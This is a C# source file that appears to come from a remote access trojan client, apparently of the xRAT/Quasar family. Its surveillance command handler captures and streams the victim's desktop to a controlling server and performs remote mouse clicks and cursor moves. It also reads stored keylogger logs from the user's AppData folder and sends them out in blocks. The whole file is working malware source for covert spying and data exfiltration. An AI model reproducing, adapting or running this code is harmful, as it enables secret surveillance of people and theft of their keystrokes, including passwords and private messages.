using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.Core.Helper;
using System.Drawing.Imaging;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
    public static partial class CommandHandler
    {
        public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
        {
            var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));

            if (StreamCodec == null)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);

            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor
                || StreamCodec.Resolution != resolution)
            {
                if (StreamCodec != null)
                    StreamCodec.Dispose();

                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(command.Monitor);
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
                    StreamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                        StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
                }
            }
            catch (Exception)
            {
                if (StreamCodec != null)
                    new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
                        StreamCodec.Resolution).Execute(client);

                StreamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        desktop.UnlockBits(desktopData);
                    }
                    desktop.Dispose();
                }
            }
        }

        public static void HandleDoMouseEvent(Packets.ServerPackets.DoMouseEvent command, Client client)
        {
            Screen[] allScreens = Screen.AllScreens;
            int offsetX = allScreens[command.MonitorIndex].Bounds.X;
            int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
            Point p = new Point(command.X + offsetX, command.Y + offsetY);

            switch (command.Action)
            {
                case MouseAction.LeftDown:
                case MouseAction.LeftUp:
                    NativeMethodsHelper.DoMouseEventLeft(p, command.IsMouseDown);
                    break;
                case MouseAction.RightDown:
                case MouseAction.RightUp:
                    NativeMethodsHelper.DoMouseEventRight(p, command.IsMouseDown);
                    break;
                case MouseAction.MoveCursor:
                    NativeMethodsHelper.DoMouseMoveCursor(p);
                    break;
            }       
        }

        public static void HandleGetMonitors(Packets.ServerPackets.GetMonitors command, Client client)
        {
            if (Screen.AllScreens.Length > 0)
            {
                new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
            }
        }

        public static void HandleGetKeyloggerLogs(Packets.ServerPackets.GetKeyloggerLogs command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";

                    if (!Directory.Exists(path))
                    {
                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                            new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new Packets.ClientPackets.GetKeyloggerLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                                //Thread.Sleep(200);
                            }
                            else
                                new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
                }
            }).Start();
        }
    }
}